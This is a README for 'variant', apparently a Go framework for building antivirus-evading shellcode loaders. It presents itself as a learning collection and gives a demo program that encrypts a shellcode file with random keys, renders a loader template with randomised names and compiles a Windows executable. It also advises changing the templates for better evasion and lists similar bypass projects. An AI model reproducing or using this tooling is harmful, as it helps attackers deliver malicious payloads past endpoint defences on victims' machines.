# variant

Go Anti-Virus Module Framework

## Description

项目`v2`更名为`variant`，现放出Demo

本项目会不断添加各种免杀的技术，但是**不适合直接不做任何修改的编译和使用**，即使是有随机特征的编译

### 特别说明

1. 学习Go免杀的代码集合，顺手做了模块化处理，**实际开发未结束，还在持续更新**；
2. 想要实现最好的免杀效果还需要自行修改渲染编译模板，代码提供了三种加载方式的渲染模板。

### 更新日志

1. 模块化配置
2. 编译功能更新
3. 渲染功能更新

## Demo

```go
package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/tmpl"
)

func main() {
	// 定义模板渲染数据
	data := tmpl.Data{
		KeyName:    rand.RStrings(),
		KeyValue:   rand.LStrings(16),
		IvName:     rand.RStrings(),
		IvValue:    rand.LStrings(16),
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "tmpl/basetmpl/payload.bin",
		Key:       []byte(data.KeyValue),
		IV:        []byte(data.IvValue),
	}
	// 加密之后的 shellcode
	tmp, err := params.SKEASetKeyIv()
	if err != nil {
		log.Fatal(err)
	}
	data.Payload = tmp

	// 设置模板的渲染参数
	TOpts := tmpl.TOpts{
		TmplFile:     "tmpl/basetmpl/base.tmpl",
		OutputDir:    "output",
		OutputGoFile: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = tmpl.BuildTmpl(TOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	opts := build.COpts{
		GoFileName:    TOpts.OutputGoFile,
		ExeFileName:   fmt.Sprintf("%s.exe", strings.TrimSuffix(TOpts.OutputGoFile, ".go")),
		HideConsole:   false,
		CompileDetail: false,
		CompilePath:   "output",
	}
	// 编译
	if err = opts.Compile(); err != nil {
		log.Fatal(err)
	}
}
```

### Thanks

https://github.com/Ne0nd0g/go-shellcode

https://github.com/safe6Sec/GolangBypassAV

https://github.com/afwu/GoBypass

https://github.com/piiperxyz/AniYa

https://github.com/wumansgy/goEncrypt

https://github.com/TideSec/GoBypassAV

https://github.com/Pizz33/GobypassAV-shellcode

https://github.com/timwhitez/Doge-Gabh

后继添加 ……
